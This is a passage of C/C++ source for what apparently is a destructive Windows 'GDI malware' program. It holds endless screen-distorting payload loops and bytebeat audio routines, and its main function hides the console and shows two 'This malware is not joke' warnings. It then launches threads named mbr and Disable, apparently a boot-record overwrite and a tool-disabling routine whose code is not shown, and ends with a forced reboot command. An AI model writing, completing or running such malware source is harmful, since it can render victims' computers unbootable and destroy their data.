	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v4 = i % SystemMetrics;
			v3 = i / SystemMetrics;
			v10 = i / SystemMetrics;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) | (i / SystemMetrics + v10);
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload12() {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v3; // [rsp+90h] [rbp+10h]
	int v4; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int v10; // [rsp+B8h] [rbp+38h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		StretchBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v4 = i % SystemMetrics;
			v3 = i / SystemMetrics;
			v10 = i / SystemMetrics;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) - (i / SystemMetrics + v10);
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload13() {
	int y1; // esi
	int x1; // ebx
	int v3; // edi
	int v4; // eax
	int v5; // esi
	int v6; // ebx
	int v7; // edi
	int v8; // eax
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+88h] [rbp+8h] BYREF
	int v11; // [rsp+90h] [rbp+10h]
	int v12; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v12 = i % SystemMetrics;
			v11 = i / cy;
			*((DWORD*)ppvBits + i) += (i % SystemMetrics) ^ (i / cy + SystemMetrics);
		}
		BitBlt(hdc, 1, 1, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload14() {
	int v1; // [rsp+50h] [rbp-30h]
	int v2; // [rsp+54h] [rbp-2Ch]
	HDC hdc; // [rsp+58h] [rbp-28h]
	int v4; // [rsp+64h] [rbp-1Ch]
	int SystemMetrics; // [rsp+68h] [rbp-18h]
	int cy; // [rsp+6Ch] [rbp-14h]
	int y; // [rsp+7Ch] [rbp-4h]

	GetDC(0i64);
	cy = GetSystemMetrics(0);
	SystemMetrics = GetSystemMetrics(1);
	v4 = SystemMetrics / 10;
	while (1)
	{
		hdc = GetDC(0i64);
		for (y = 2; SystemMetrics / 2 + SystemMetrics > y; ++y)
		{
			v2 = (int)((double)999 * sin((float)((float)y / (float)v4) * 3.141592653589793));
			BitBlt(hdc, 0, y, SystemMetrics, cy, hdc, y, v2 / 2, 0xCC0020u);
			BitBlt(hdc, y, 0, SystemMetrics, cy, hdc, y, v2 / 2, 0xCC0020u);
			v1 = (int)((double)999 * sin((float)((float)y / (float)v4) * 3.141592653589793));
			BitBlt(hdc, y, 0, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
			BitBlt(hdc, 0, y, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
		}
	}
}
DWORD WINAPI payload15() {
	int v1; // [rsp+50h] [rbp-30h]
	int v2; // [rsp+54h] [rbp-2Ch]
	HDC hdc; // [rsp+58h] [rbp-28h]
	int v4; // [rsp+64h] [rbp-1Ch]
	int SystemMetrics; // [rsp+68h] [rbp-18h]
	int cy; // [rsp+6Ch] [rbp-14h]
	int y; // [rsp+7Ch] [rbp-4h]

	GetDC(0i64);
	cy = GetSystemMetrics(0);
	SystemMetrics = GetSystemMetrics(1);
	v4 = SystemMetrics / 10;
	while (1)
	{
		hdc = GetDC(0i64);
		for (y = 2; SystemMetrics / 2 + SystemMetrics > y; ++y)
		{
			v1 = (int)((double)9 * sin((float)((float)y / (float)v4) * 3.141592653589793));
			BitBlt(hdc, y, 0, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
			BitBlt(hdc, 0, y, cy, SystemMetrics, hdc, v1 / 2, y, 0xCC0020u);
		}
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ^ t + (t >> 8 | 1) / (t - 12800 ^ t) >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0xCA98 >> (t >> 9 & 14) & 15) | t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 1 ^ (t << 1) + (t >> 7) & t >> 12 | t >> 4 - (1 ^ 7 & t >> 19) | t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t * (t >> 10) * (t >> 7 | t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(2 * (t >> 5 & t) - (t >> 5) + t * (t >> 14 & 14));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (3 + (1 ^ t >> 10 & 5)) * (5 + (3 & t >> 14)) >> (t >> 8 & 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 2) & (t >> 6)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	Sleep(1000);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	Sleep(1000);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t / 4 & 0xf4) >> t / ((t >> 14 & 3) + 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	Sleep(1000);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> ((t & 4096) ? ((t * t) / 4096) : (t / 4096))) | (t << (t / 256)) | (t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
	Sleep(1000);
}
int main() {
	HANDLE v4; // edi
	HANDLE v5; // edi
	HANDLE v6; // edi
	HANDLE v7; // edi
	HANDLE v8; // esi
	HANDLE v9; // esi
	HANDLE v10; // esi
	HANDLE v11; // esi
	HANDLE v12; // esi
	HANDLE v13; // esi
	HANDLE v14; // edi
	HANDLE v16; // esi
	HANDLE v17; // esi
	HANDLE v18; // esi
	HANDLE v19; // ebx
	HANDLE v20; // edi
	HANDLE v21; // esi
	HANDLE v22; // esi
	HANDLE v23; // esi
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"This malware is not joke\r\n\The creator is not responsible for any damages\r\n\YOU will responsible if you turn on this thing!!!\r\n\Execute???", L"ALERT!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"LAST WARNING!!!\r\n\THIS IS NOT JOKE!!!\r\n\FINALLY EXECUTE IT???", L"ALERT!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{   
			v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mbr, 0, 0, 0);
			v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
			v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Disable, 0, 0, 0);
			sound1();
			Sleep(0x7530u);
			TerminateThread(v6, 0);
			CloseHandle(v6);
			InvalidateRect(0, 0, 0);
			v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);
			sound2();
			Sleep(0x3A98u);
			TerminateThread(v8, 0);
			CloseHandle(v8);
			InvalidateRect(0, 0, 0);
			v9 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);
			sound3();
			Sleep(0x61A8u);
			TerminateThread(v9, 0);
			CloseHandle(v9);
			InvalidateRect(0, 0, 0);
			v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);
			sound4();
			Sleep(0x61A8u);
			TerminateThread(v10, 0);
			CloseHandle(v10);
			v11 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
			sound5();
			Sleep(0x3A98u);
			TerminateThread(v11, 0);
			CloseHandle(v11);
			v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);
			sound6();
			Sleep(0x61A8u);
			TerminateThread(v12, 0);
			CloseHandle(v12);
			v13 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);
			sound7();
			Sleep(0x61A8u);
			TerminateThread(v13, 0);
			CloseHandle(v13);
			v14 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);
			sound8();
			Sleep(0x4E20u);
			TerminateThread(v14, 0);
			CloseHandle(v14);
			v16 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);
			sound9();
			Sleep(0x61A8u);
			TerminateThread(v16, 0);
			CloseHandle(v16);
			v17 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);
			sound10();
			Sleep(0x61A8u);
			TerminateThread(v17, 0);
			CloseHandle(v17);
			v18 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload11, 0, 0, 0);
			sound11();
			Sleep(0x61A8u);
			system("C:\\Windows\\System32\\shutdown /r t 0");
		}
	}
}